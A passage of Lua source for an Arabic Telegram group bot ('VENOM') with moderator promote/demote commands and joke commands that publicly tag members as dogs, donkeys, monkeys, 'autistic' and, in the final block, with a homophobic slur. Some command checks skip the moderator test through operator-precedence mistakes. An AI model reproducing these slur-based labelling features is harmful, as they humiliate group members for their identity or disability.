t = "\n 𖥔 وينكم تعالو يريدوكم بالجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- 「 '..v..' 」\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد مميزين"
end
send(msg.chat_id_, msg.id_, t)
end
if text == ("رفع مميز") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مميز @(.*)$") and Mod(msg) then
local username = text:match("^رفع مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔 عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم ترقيته مميز'
texts = usertext..statuss
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^رفع مميز (%d+)$") and Mod(msg) then
local userid = text:match("^رفع مميز (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
database:sadd(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
local  statuss  = '\n 𖥔 تم ترقيته مميز'
send(msg.chat_id_, msg.id_, usertext..statuss)
end;end,nil)
return false
end

if (text == ("تنزيل مميز")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Special:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز @(.*)$") and Mod(msg) then
local username = text:match("^تنزيل مميز @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Special:User'..msg.chat_id_, result.id_)
usertext = '\n 𖥔 الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المميزين'
texts = usertext..status
else
texts = ' 𖥔 لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مميز (%d+)$") and Mod(msg) then
local userid = text:match("^تنزيل مميز (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Special:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖥔 لعضو  ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖥔 الـعـضو   ↚ '..userid..''
status  = '\n 𖥔 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end  
------------------------------------------------------------------------
if text == 'مسح المتوحدين' and Mod(msg) then
database:del(bot_id..'Mote:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع المتوحدين')
end
if text == ("تاك للمتوحدين") and Mod(msg) then
local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
t = "\n 𖥔 قائمة متوحدين الجروب \n⧬━┅┅┄⟞❲[??🅞🅞🅽](t.me/SOURCEVENOM)❳⟝┄┉┉━⧬\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ المتوحد [@"..username.."]\n"
else
t = t..""..k.." ↚ المتوحد `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد متوحدين"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع متوحد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖥔 تم رفع الـعـضو  متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل متوحد")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mote:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل الـعـضو  متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الزوجات' and Mod(msg) then
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع الزوجات')
end
if text == ("تاك للزوجات") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 𖥔 قائمه زوجات الجروب \n 𖥔═───═❲[🅢🅞🅞🅝](t.me/SOURCEVENOM)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الزوجه [@"..username.."]\n"
else
t = t..""..k.." ↚ الزوجه `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 مع الاسف لا يوجد زوجه"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع زوجتي") or text == ("زواج") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو  ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖥔 تم رفع العضــو زوجه في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("تنزيل زوجتي") or text == ("طلاق") and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو  ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل العضــو الزوجات من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الكلاب' and Mod(msg) then
database:del(bot_id..'Modde:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم مسح جميع الكلاب')
end
if text == ("تاك للكلاب") and Mod(msg) then
local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
t = "\n 𖥔 قائمه كلاب الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الكلب [@"..username.."]\n"
else
t = t..""..k.." ↚ الكلب `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 مع الاسف لا يوجد كلاب"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع كلب") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n ??  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو  ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖥔 تم رفع العضــو كلب في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل كلب")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Modde:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 العضــو  ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل العضــو كلب من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'ممسح الحمير' and Mod(msg) then
database:del(bot_id..'Sakl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع حمير من الجروب')
end
if text == ("تاك للحمير") and Mod(msg) then
local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
t = "\n 𖥔 قائمة حمير الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الحمار [@"..username.."]\n"
else
t = t..""..k.." ↚ الحمار `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد حمير"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع حمار") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع المتهم حمار بالجروب\n 𖥔 الان اصبح حمار الجروب'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if (text == ("تنزيل حمار")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sakl:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل الـعـضو  حمار\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الوتكات' and Mod(msg) then
database:del(bot_id..'Motte:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع وتكات الجروب')
end
if text == ("تاك للوتكات") and Mod(msg) then
local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
t = "\n 𖥔 قائمة وتكات الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الوتكه [@"..username.."]\n"
else
t = t..""..k.." ↚ الوتكه `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد وتكات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع وتكه") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع وتكه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل وتكه")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motte:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل وتكه في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح القرده' and Mod(msg) then
database:del(bot_id..'Motee:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع القرده بالجروب')
end
if text == ("تاك للقرود") and Mod(msg) then
local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
t = "\n 𖥔 قائمة القرود الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ القرد [@"..username.."]\n"
else
t = t..""..k.." ↚ القرد `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد قرد"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع قرد") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع قرد في الجروب\n 𖥔 تعال حبي استلم موزه'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل قرد")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Motee:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل قرد من الجروب\n 𖥔 رجع موزه حبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الارامل' and Mod(msg) then
database:del(bot_id..'Bro:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع الارامل بالجروب')
end
if text == ("تاك للارامل") and Mod(msg) then
local list = database:smembers(bot_id..'Bro:User'..msg.chat_id_)
t = "\n 𖥔 قائمة ارامل الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الارمله [@"..username.."]\n"
else
t = t..""..k.." ↚ الارمله `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد ارامل"
end
send(msg.chat_id_, msg.id_, t)
end
---------
if text == ("رفع ارمله") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖥔 تم تعطيل الرفع') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖥔 تم رفع ارمله في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if (text == ("تنزيل ارمله")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Bro:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔 تم تنزيل ارمله من الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
-----------------------------------------------------
if text == 'مسح الخولات' and Mod(msg) then
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖥔 تم تنزيل جميع الخولات بالجروب')
end
if text == ("تاك للخولات") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n 𖥔 قائمة خولات الجروب \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.." ↚ الخول [@"..username.."]\n"
else
t = t..""..k.." ↚ الخول `"..v.."`\n"
end
end
if #list == 0 then
t = " 𖥔 لا يوجد خولات"
end
send(msg.chat_id_, msg.id_, t)
end
---------
